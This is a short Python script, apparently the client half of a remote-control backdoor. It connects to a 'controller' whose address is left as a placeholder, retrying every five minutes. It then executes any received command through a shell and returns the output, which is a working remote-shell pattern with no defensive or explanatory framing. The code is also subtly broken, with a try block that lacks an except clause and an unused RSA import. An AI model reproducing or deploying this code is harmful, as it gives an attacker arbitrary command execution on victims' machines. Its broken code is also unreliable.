import socket
from subprocess import check_output
from cryptography.hazmat.primitives.asymmetric import rsa
from time import sleep

SELF = socket.gethostbyname(socket.gethostname())
PORT = 5051
BUFFER_SIZE = 1024
FORMAT = "utf-8"
SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
SOCKET.bind((SELF, PORT))

HOST = "ENTER CONTROLLER IP ADDRESS HERE"

while True:
    #standby mode (trying to connect to the controller until successful )
    successful = False
    while not successful:
        try:
            #using this computer's IP address temporarily for testing on the same computer
            SOCKET.connect((SELF, 5050))
            successful = True
        if not successful: sleep(300)
    #active mode (executing commands from the controller)
    while True:
        command = SOCKET.recv(BUFFER_SIZE).decode(FORMAT).split(" ")
        if command[0] == "exit":
            break
        SOCKET.send(check_output(command, shell=True))

